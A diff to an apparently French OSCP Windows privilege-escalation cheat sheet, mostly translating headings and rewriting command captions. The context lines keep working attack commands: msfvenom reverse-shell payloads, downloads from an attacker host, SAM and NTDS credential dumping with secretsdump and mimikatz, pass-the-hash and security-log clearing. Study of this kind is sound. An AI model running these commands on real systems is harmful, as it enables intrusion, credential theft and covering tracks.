@@ -11,10 +11,10 @@ Auditer les services, jetons et configurations d'un poste Windows.
 ## Énumération
 
 
-**Username and Hostname**
+**Utilisateur et nom de la machine**
 
 
-<p class="oscp-command-note">Afficher des informations de la session ou du système.</p>
+<p class="oscp-command-note">Afficher le compte utilisateur courant.</p>
 
 ```text
 whoami
@@ -25,89 +25,89 @@ whoami
 `Get-LocalUser`  
 
 
-**Existing Users**
+**Utilisateurs locaux**
 
 
 **Paramètres et repères :**
 `Get-LocalGroup`  
 
 
-**Existing Groups**
+**Groupes locaux**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil net.</p>
+<p class="oscp-command-note">Lister les groupes locaux Windows.</p>
 
 ```text
 net localgroup
 ```
 
 
-<p class="oscp-command-note">Afficher des informations de la session ou du système.</p>
+<p class="oscp-command-note">Afficher les membres d&#x27;un groupe local.</p>
 
 ```powershell
 Get-LocalGroupMember -GroupName [GroupName]
 ```
 
 
-**Operating System, Version, and Architecture**
+**Système, version et architecture**
 
 
-<p class="oscp-command-note">Afficher des informations de la session ou du système.</p>
+<p class="oscp-command-note">Afficher la version et la configuration de Windows.</p>
 
 ```text
 systeminfo
 ```
 
 
-**Network Information**
+**Configuration réseau**
 
 
-<p class="oscp-command-note">Afficher des informations de la session ou du système.</p>
+<p class="oscp-command-note">Afficher la configuration réseau Windows.</p>
 
 ```text
 ipconfig /all
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil route.</p>
+<p class="oscp-command-note">Afficher ou modifier les routes réseau.</p>
 
 ```text
 route print
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil netstat.</p>
+<p class="oscp-command-note">Examiner les ports et connexions réseau.</p>
 
 ```text
 netstat -ano
 ```
 
 
-**Installed Applications**
+**Logiciels installés**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil get-itemproperty.</p>
+<p class="oscp-command-note">Lister les logiciels installés depuis le Registre.</p>
 
 ```powershell
 Get-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil select-object.</p>
+<p class="oscp-command-note">Sélectionner les propriétés de la sortie PowerShell.</p>
 
 ```sql
 Select-Object -Property DisplayName
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil get-itemproperty.</p>
+<p class="oscp-command-note">Lister les logiciels installés depuis le Registre.</p>
 
 ```powershell
 Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil select-object.</p>
+<p class="oscp-command-note">Sélectionner les propriétés de la sortie PowerShell.</p>
 
 ```sql
 Select-Object -Property DisplayName
@@ -118,20 +118,20 @@ Select-Object -Property DisplayName
 `Get-Process`  
 
 
-**Running Processes**
+**Processus actifs**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil select-object.</p>
+
 
 ```sql
 Select-Object -Property ProcessName, Path
 ```
 
 
-**Service Accounts**
+**Comptes de service**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil get-wmiobject.</p>
+<p class="oscp-command-note">Examiner les informations système WMI.</p>
 
 ```powershell
 Get-WmiObject -Class Win32_Service | Select-Object Name, StartName
@@ -141,37 +141,37 @@ Get-WmiObject -Class Win32_Service | Select-Object Name, StartName
 **Tâches planifiées**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil get-scheduledtask.</p>
+<p class="oscp-command-note">Lister les tâches planifiées Windows.</p>
 
 ```powershell
 Get-ScheduledTask | Select-Object TaskName, TaskPath, State
 ```
 
 
-**Local Administrator Group Members**
+**Membres du groupe Administrateurs**
 
 
-<p class="oscp-command-note">Afficher des informations de la session ou du système.</p>
+<p class="oscp-command-note">Afficher les membres d&#x27;un groupe local.</p>
 
 ```powershell
 Get-LocalGroupMember -GroupName "Administrators"
 ```
 
 
-**System Drives and Mounted Volumes**
+**Lecteurs et volumes**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil get-psdrive.</p>
+<p class="oscp-command-note">Lister les lecteurs PowerShell.</p>
 
 ```powershell
 Get-PSDrive -PSProvider FileSystem
 ```
 
 
-**PowerShell Version**
+**Version de PowerShell**
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Énumération ».</p>
+
 
 ```text
 $PSVersionTable.PSVersion
@@ -181,7 +181,7 @@ $PSVersionTable.PSVersion
 ## Recherche de fichiers
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil get-childitem.</p>
+<p class="oscp-command-note">Rechercher des fichiers avec PowerShell.</p>
 
 ```powershell
 Get-ChildItem -Path C:\Users\ -Include *.* -File -Recurse -ErrorAction SilentlyContinue
@@ -233,7 +233,7 @@ Get-ChildItem -Path [Path] -Directory -Recurse | Where-Object {
 `Runas`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil runas.</p>
+
 
 ```powershell
 # Replace [Domain\Username] with the target username (e.g., backupadmin). You will be prompted to enter the password for the specified user.
@@ -250,7 +250,7 @@ Observer les permissions et la configuration de Windows.
 `Get-History`  
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Journaux PowerShell ».</p>
+
 
 ```powershell
 (Get-PSReadlineOption).HistorySavePath
@@ -277,7 +277,7 @@ foreach ($profile in $userProfiles) {
 ### Vérifier les privilèges
 
 
-<p class="oscp-command-note">Afficher des informations de la session ou du système.</p>
+<p class="oscp-command-note">Afficher le compte utilisateur courant.</p>
 
 ```powershell
 whoami /priv
@@ -287,7 +287,7 @@ whoami /priv
 ### Enable All Tokens
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil ..</p>
+
 
 ```powershell
 .\EnableAllTokenPrivs.ps1
@@ -295,7 +295,7 @@ whoami /priv
 ```
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Enable All Tokens ».</p>
+<p class="oscp-command-note">Script PowerShell dans la rubrique « Enable All Tokens ».</p>
 
 ```powershell
 ## All Credit goes to Lee Holmes (@Lee_Holmes on twitter).  I found the code here https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/
@@ -388,7 +388,7 @@ $type[0]::EnablePrivilege() 2>&1
 **SeAudit**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil authz.</p>
+
 
 ```text
 Authz Report Security Event
@@ -402,7 +402,7 @@ Authz Report Security Event
 **SeBackup**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil hklm.</p>
+
 
 ```text
 HKLM\SAM
@@ -425,7 +425,7 @@ HKLM\SYSTEM
 **SeBackup**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil hklm.</p>
+
 
 ```text
 HKLM\SAM
@@ -437,7 +437,7 @@ HKLM\SYSTEM
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil cmd.</p>
+
 
 ```text
 cmd /c "reg save HKLM\SAM SAM & reg save HKLM\SYSTEM SYSTEM"
@@ -448,7 +448,7 @@ cmd /c "reg save HKLM\SAM SAM & reg save HKLM\SYSTEM SYSTEM"
 `SAM` · `Impacket` · `secretsdump.py`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil secretsdump.py.</p>
+<p class="oscp-command-note">Examiner les données d&#x27;authentification avec SecretsDump.</p>
 
 ```text
 secretsdump.py -sam SAM -system SYSTEM LOCAL
@@ -460,21 +460,21 @@ secretsdump.py -sam SAM -system SYSTEM LOCAL
 `psexec.py`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil psexec.py.</p>
+<p class="oscp-command-note">Exécuter une commande distante via SMB.</p>
 
 ```text
 psexec.py -hashes ":<ADMINISTRATOR_NTLM>" <Administrator>@<TARGET_IP>
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil robocopy.</p>
+
 
 ```text
 robocopy /b
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil user.</p>
+
 
 ```text
 User Account Control
@@ -486,14 +486,14 @@ User Account Control
 `WinRM` · `RDP`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil restricted.</p>
+
 
 ```text
 Restricted Admin
 ```
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Tableau des privilèges ».</p>
+
 
 ```text
 %WINDIR%\MEMORY.DMP
@@ -504,7 +504,7 @@ Restricted Admin
 `SeBackupPrivilege` · `SeBackup` · `SeRestore` · `/b`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil backup.</p>
+
 
 ```text
 Backup Operators
@@ -515,7 +515,7 @@ Backup Operators
 `Copy-FileSeBackupPrivilege` · `SeBackup`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil import-module.</p>
+<p class="oscp-command-note">Charger un module PowerShell.</p>
 
 ```powershell
 Import-Module .\SeBackupPrivilegeUtils.dll
@@ -531,7 +531,7 @@ Import-Module .\SeBackupPrivilegeCmdLets.dll
 `Set-SeBackupPrivilege`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil copy-filesebackupprivilege.</p>
+
 
 ```text
 Copy-FileSeBackupPrivilege <SOURCE_FILE> <DEST_FILE>
@@ -615,7 +615,7 @@ Copy-FileSeBackupPrivilege <SOURCE_FILE> <DEST_FILE>
 **SeIncreaseBasePriority**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil start.</p>
+
 
 ```text
 start /realtime SomeCpuIntensiveApp.exe
@@ -643,7 +643,7 @@ start /realtime SomeCpuIntensiveApp.exe
 **SeLoadDriver**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil fltmc.</p>
+
 
 ```text
 fltMC sysmondrv
@@ -675,7 +675,7 @@ fltMC sysmondrv
 **SeManageVolume**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil synchronize.</p>
+
 
 ```text
 SYNCHRONIZE | FILE_TRAVERSE
@@ -707,7 +707,7 @@ SYNCHRONIZE | FILE_TRAVERSE
 **SeRemoteShutdown**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil shutdown.</p>
+
 
 ```text
 shutdown /s /f /m \\server1 /d P:5:19
@@ -735,7 +735,7 @@ shutdown /s /f /m \\server1 /d P:5:19
 **SeSecurity**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil wevtutil.</p>
+
 
 ```text
 wevtutil cl Security
@@ -754,7 +754,7 @@ wevtutil sl Security /ms:0
 **SeShutdown**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil shutdown.exe.</p>
+
 
 ```text
 shutdown.exe /s /f /t 1
@@ -789,7 +789,7 @@ shutdown.exe /s /f /t 1
 **SeSystemtime**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil cmd.exe.</p>
+
 
 ```text
 cmd.exe /c date 01-01-01
@@ -812,14 +812,14 @@ cmd.exe /c time 00:00
 **SeTakeOwnership**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil takeown.exe.</p>
+
 
 ```text
 takeown.exe /f "%windir%\system32"
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil icacls.exe.</p>
+
 
 ```text
 icacls.exe "%windir%\system32" /grant "%username%":F
@@ -840,7 +840,7 @@ icacls.exe "%windir%\system32" /grant "%username%":F
 **SeTimeZone**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil tzutil.</p>
+
 
 ```text
 tzutil /s "Chatham Islands Standard Time"
@@ -875,7 +875,7 @@ tzutil /s "Chatham Islands Standard Time"
 `FullPowers.exe` · `SeAssignPrimaryToken` · `SeImpersonate`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil python3.</p>
+<p class="oscp-command-note">Exécuter un script Python.</p>
 
 ```bash
 python3 -m http.server 80
@@ -884,7 +884,7 @@ python3 -m http.server 80
 ![Initial Privileges of the Service Account.](https://www.emmanuelsolis.com/img/fullpowers_1.png)
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil cerutil.exe.</p>
+<p class="oscp-command-note">Script PowerShell dans la rubrique « FullPowers.exe ».</p>
 
 ```powershell
 # CMD
@@ -901,7 +901,7 @@ iwr -uri http://[kali_ip]/FullPowers.exe -O FullPowers.exe
 `FullPowers.exe`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil ./fullpowers.exe.</p>
+
 
 ```powershell
 # Basic Usage
@@ -924,7 +924,7 @@ iwr -uri http://[kali_ip]/FullPowers.exe -O FullPowers.exe
 `FullPowers.exe`  
 
 
-<p class="oscp-command-note">Afficher des informations de la session ou du système.</p>
+<p class="oscp-command-note">Afficher le compte utilisateur courant.</p>
 
 ```powershell
 whoami /priv
@@ -942,7 +942,7 @@ whoami /priv
 ### Vérifications principales
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil get-ciminstance.</p>
+<p class="oscp-command-note">Examiner les propriétés CIM du système.</p>
 
 ```powershell
 # Tip: Look for services with paths outside of `system32` or other unexpected locations.; try to find that thing that seems out of place.
@@ -950,21 +950,21 @@ Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Ob
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil icacls.</p>
+<p class="oscp-command-note">Vérifier les permissions NTFS.</p>
 
 ```powershell
 icacls "C:\Path\To\ServiceBinary.exe"
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil get-ciminstance.</p>
+<p class="oscp-command-note">Examiner les propriétés CIM du système.</p>
 
 ```powershell
 Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -eq '<ServiceName>'}
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil int.</p>
+
 
 ```text
 #include <stdlib.h>
@@ -978,7 +978,7 @@ int main ()
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil x86_64-w64-mingw32-gcc.</p>
+
 
 ```bash
 # Cross-Compile the C Code to a 64-bit Application
@@ -986,7 +986,7 @@ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil msfvenom.</p>
+<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>
 
 ```bash
 # For 64-bit executable
@@ -1001,7 +1001,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -
 `msfvenom`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil iwr.</p>
+<p class="oscp-command-note">Interroger une URL avec PowerShell.</p>
 
 ```powershell
 # Remember to run the HTTP server on your Kali to be able to bring the binary.
@@ -1013,7 +1013,7 @@ move .\adduser.exe "C:\Path\To\ServiceBinary.exe"
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil restart-service.</p>
+
 
 ```powershell
 Restart-Service -Name '<ServiceName>'
@@ -1024,7 +1024,7 @@ Restart-Service -Name '<ServiceName>'
 `sc.exe`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil sc.exe.</p>
+
 
 ```powershell
 sc.exe stop <ServiceName>
@@ -1032,7 +1032,7 @@ sc.exe start <ServiceName>
 ```
 
 
-<p class="oscp-command-note">Afficher des informations de la session ou du système.</p>
+<p class="oscp-command-note">Afficher le compte utilisateur courant.</p>
 
 ```powershell
 # First check for reboot privileges: SeShutdownPrivilege should be Assigned and Enabled.
@@ -1046,7 +1046,7 @@ shutdown /r /t 0
 ### Vérifications complémentaires
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil cp.</p>
+<p class="oscp-command-note">Copier les fichiers indiqués.</p>
 
 ```bash
 cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
@@ -1054,7 +1054,7 @@ python3 -m http.server 80
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil iwr.</p>
+<p class="oscp-command-note">Interroger une URL avec PowerShell.</p>
 
 ```powershell
 iwr -uri http://<attacker-ip>/PowerUp.ps1 -Outfile PowerUp.ps1
@@ -1068,14 +1068,14 @@ Install-ServiceBinary -Name '<ServiceName>'
 ```
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Vérifications complémentaires ».</p>
+
 
 ```powershell
 $ModifiableFiles = echo 'C:\Path\To\ServiceBinary.exe' | Get-ModifiablePath -Literal
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil get-ciminstance.</p>
+<p class="oscp-command-note">Examiner les propriétés CIM du système.</p>
 
 ```powershell
 Get-CimInstance -ClassName win32_service | Select Name, PathName | ForEach-Object {
@@ -1093,7 +1093,7 @@ Get-CimInstance -ClassName win32_service | Select Name, PathName, DependentServi
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil icacls.</p>
+<p class="oscp-command-note">Vérifier les permissions NTFS.</p>
 
 ```powershell
 # Some services use configuration files that can be hijacked similarly to service binaries. Example: Checking permissions on a configuration file
@@ -1105,7 +1105,7 @@ icacls "C:\Path\To\Service\ConfigFile.ini"
 `impacket-tool`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil strings.</p>
+<p class="oscp-command-note">Rechercher les chaînes de caractères lisibles.</p>
 
 ```bash
 strings [downloaded_binary]
@@ -1118,14 +1118,14 @@ flare-floss [downloaded_binary]
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil get-winevent.</p>
+
 
 ```powershell
 Get-WinEvent -LogName System | Where-Object {$_.Message -like "*<ServiceName>*"}
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil get-windowsupdatelog.</p>
+
 
 ```powershell
 # Check for system update settings that might revert changes
@@ -1136,11 +1136,7 @@ Get-WindowsUpdateLog
 ## Chargement de DLL par un service
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil c.</p>
-
-```text
-C:\Windows\System32
-```
+<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Windows\System32</code></p>
 
 
 ```text
@@ -1157,7 +1153,7 @@ C:\Windows
 `PATH` · `ProcMon` · `depends.exe`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil get-ciminstance.</p>
+<p class="oscp-command-note">Examiner les propriétés CIM du système.</p>
 
 ```powershell
 # List running services and their executable paths
@@ -1169,7 +1165,7 @@ Get-CimInstance -ClassName win32_service | Select Name, State, PathName | Where-
 `PATH`  
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Chargement de DLL par un service ».</p>
+
 
 ```powershell
 # Display the PATH environment variable
@@ -1177,7 +1173,7 @@ $env:path
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil bool.</p>
+
 
 ```text
 #include <windows.h>
@@ -1197,7 +1193,7 @@ BOOL APIENTRY DllMain(
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil x86_64-w64-mingw32-gcc.</p>
+
 
 ```bash
 # Cross-Compile the DLL
@@ -1205,7 +1201,7 @@ x86_64-w64-mingw32-gcc DLLMain.cpp --shared -o DLLMain.dll
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil msfvenom.</p>
+<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>
 
 ```bash
 # For 64-bit DLL
@@ -1220,7 +1216,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f dll -
 `msfvenom`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil move.</p>
+<p class="oscp-command-note">Script PowerShell dans la rubrique « Chargement de DLL par un service ».</p>
 
 ```powershell
 # Bring the file from your Kali using an HTTP server
@@ -1236,7 +1232,7 @@ Restart-Service -Name "[serviceToHijack]"
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil net.</p>
+<p class="oscp-command-note">Examiner les comptes utilisateurs Windows.</p>
 
 ```powershell
 # List users to check if the new user was added
@@ -1247,7 +1243,7 @@ net localgroup administrators
 ```
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Chargement de DLL par un service ».</p>
+
 
 ```powershell
 # Display the PATH environment variable
@@ -1258,18 +1254,14 @@ $env:path
 ## Chemins de services sans guillemets
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil wmic.</p>
+<p class="oscp-command-note">Interroger les informations système via WMI.</p>
 
 ```powershell
 wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil c.</p>
-
-```text
-C:\Program Files\MyApp\app.exe
-```
+<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Program Files\MyApp\app.exe</code></p>
 
 
 ```text
@@ -1281,11 +1273,7 @@ C:\Program Files\MyApp\app.exe
 `.exe`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil c.</p>
-
-```text
-C:\Program.exe
-```
+<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Program.exe</code></p>
 
 
 ```text
@@ -1307,11 +1295,7 @@ C:\Program Files\
 `app.exe`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil c.</p>
-
-```text
-C:\Program Files\ExampleApp\ExampleService.exe
-```
+<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Program Files\ExampleApp\ExampleService.exe</code></p>
 
 
 ```text
@@ -1319,14 +1303,14 @@ C:\Program.exe
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil icacls.</p>
+<p class="oscp-command-note">Vérifier les permissions NTFS.</p>
 
 ```powershell
 icacls "<PathToDirectory>"
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil iwr.</p>
+<p class="oscp-command-note">Interroger une URL avec PowerShell.</p>
 
 ```powershell
 # Download PowerUp script
@@ -1341,7 +1325,7 @@ Get-UnquotedService
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil copy.</p>
+<p class="oscp-command-note">Script PowerShell dans la rubrique « Chemins de services sans guillemets ».</p>
 
 ```powershell
 # Create the binary from Kali, could be any program, for example a reverse shell, or a program that adds a new user.
@@ -1366,21 +1350,21 @@ Get-WinEvent -LogName System | Where-Object {$_.Id -eq 7036 -and $_.Message -lik
 ## Tâches planifiées
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil schtasks.</p>
+<p class="oscp-command-note">Examiner les tâches planifiées Windows.</p>
 
 ```powershell
 schtasks /query /fo LIST /v
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil icacls.</p>
+<p class="oscp-command-note">Vérifier les permissions NTFS.</p>
 
 ```powershell
 icacls "C:\Path\To\ScheduledTaskExecutable.exe"
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil iwr.</p>
+<p class="oscp-command-note">Interroger une URL avec PowerShell.</p>
 
 ```powershell
 iwr -Uri http://<attacker-ip>/malicious.exe -Outfile malicious.exe
@@ -1394,7 +1378,7 @@ move .\malicious.exe C:\Path\To\TargetDirectory\Executable.exe
 ### Connexions réseau actives
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil netstat.</p>
+<p class="oscp-command-note">Examiner les ports et connexions réseau.</p>
 
 ```bash
 netstat -ano
@@ -1418,7 +1402,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 ### Using Findstr
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil findstr.</p>
+
 
 ```bash
 findstr /si password *.txt
@@ -1430,7 +1414,7 @@ findstr /si password *.ini
 ### Searching in Configuration Files
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil dir.</p>
+<p class="oscp-command-note">Lister les fichiers du répertoire.</p>
 
 ```bash
 dir /s *pass* == *cred* == *vnc* == *.config*
@@ -1440,7 +1424,7 @@ dir /s *pass* == *cred* == *vnc* == *.config*
 ### Searching in All Files
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil findstr.</p>
+
 
 ```bash
 findstr /spin "password" *.*
@@ -1451,7 +1435,7 @@ findstr /spin "password" *.*
 ### Check Specific Files
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil c.</p>
+<p class="oscp-command-note">Script shell dans la rubrique « Check Specific Files ».</p>
 
 ```bash
 c:\sysprep.inf
@@ -1465,7 +1449,7 @@ c:\unattend.xml
 ### Searching for VNC Fichiers de mots de passe
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil dir.</p>
+<p class="oscp-command-note">Lister les fichiers du répertoire.</p>
 
 ```bash
 dir c:\*vnc.ini /s /b
@@ -1482,11 +1466,7 @@ dir c:\ /s /b | findstr /si *vnc.ini
 `SECURITY` · `NTUSER.dat`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil c.</p>
-
-```text
-C:\Windows\System32\SAM
-```
+<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Windows\System32\SAM</code></p>
 
 
 ```text
@@ -1501,7 +1481,7 @@ C:\windows.old\Windows\System32\SAM
 ### Dumping SAM and SYSTEM Files
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil reg.</p>
+<p class="oscp-command-note">Consulter ou modifier une clé de Registre.</p>
 
 ```powershell
 reg save hklm\sam <destination_path>\sam
@@ -1513,7 +1493,7 @@ reg save hklm\system <destination_path>\system
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil samdump2.</p>
+
 
 ```bash
 samdump2 <system_file> <sam_file>
@@ -1522,7 +1502,7 @@ impacket-secretsdump -sam <sam_file> -system <system_file> LOCAL
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil mimikatz.</p>
+<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
 
 ```powershell
 mimikatz # lsadump::sam /sam:"<sam_file>" /system:"<system_file>"
@@ -1534,28 +1514,28 @@ mimikatz # lsadump::sam /sam:"<sam_file>" /system:"<system_file>"
 Examiner les objets, les droits et les services du domaine.
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil copy.</p>
+
 
 ```powershell
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ShadowCopyID>\windows\ntds\ntds.dit <destination_path>\ntds.dit.bak
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil reg.exe.</p>
+
 
 ```powershell
 reg.exe save hklm\system <destination_path>\system.bak
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil impacket-secretsdump.</p>
+<p class="oscp-command-note">Examiner les données d&#x27;authentification avec SecretsDump.</p>
 
 ```bash
 impacket-secretsdump -ntds <ntds_dit_backup> -system <system_backup> LOCAL
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil mimikatz.</p>
+<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
 
 ```powershell
 mimikatz # lsadump::ntds /ntds:"<ntds_dit_backup>" /system:"<system_backup>"
@@ -1567,7 +1547,7 @@ mimikatz # lsadump::ntds /ntds:"<ntds_dit_backup>" /system:"<system_backup>"
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil reg.</p>
+<p class="oscp-command-note">Consulter ou modifier une clé de Registre.</p>
 
 ```powershell
 reg save hklm\security <destination_path>\security
@@ -1579,14 +1559,14 @@ reg save hklm\system <destination_path>\system
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil impacket-secretsdump.</p>
+<p class="oscp-command-note">Examiner les données d&#x27;authentification avec SecretsDump.</p>
 
 ```bash
 impacket-secretsdump -security <security_file> -system <system_file> LOCAL
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil mimikatz.</p>
+<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
 
 ```powershell
 mimikatz # lsadump::secrets /security:"<security_file>" /system:"<system_file>"
@@ -1602,14 +1582,10 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 `NTUSER.dat`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil c.</p>
-
-```text
-C:\Users\<username>\NTUSER.dat
-```
+<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Users\&lt;username&gt;\NTUSER.dat</code></p>
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil reg.</p>
+<p class="oscp-command-note">Consulter ou modifier une clé de Registre.</p>
 
 ```powershell
 reg load hku\TempHive <path_to_ntuser.dat>
@@ -1619,14 +1595,14 @@ reg load hku\TempHive <path_to_ntuser.dat>
 ### General Volume Shadow Copy Access
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil vssadmin.</p>
+
 
 ```powershell
 vssadmin list shadows
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil copy.</p>
+
 
 ```powershell
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ShadowCopyID>\<path_to_file> <destination_path>
@@ -1645,7 +1621,7 @@ Observer les permissions et la configuration de Windows.
 ### How to Check for the Vulnerability
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil reg.</p>
+<p class="oscp-command-note">Consulter la valeur d&#x27;une clé du Registre.</p>
 
 ```powershell
 # Check in HKEY_LOCAL_MACHINE for system-wide policy
@@ -1670,14 +1646,14 @@ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevat
 `1`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil msfvenom.</p>
+<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>
 
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f msi -o malicious.msi
 ```
 
 
-<p class="oscp-command-note">Ouvrir un port d&#x27;écoute avec Netcat.</p>
+<p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>
 
 ```bash
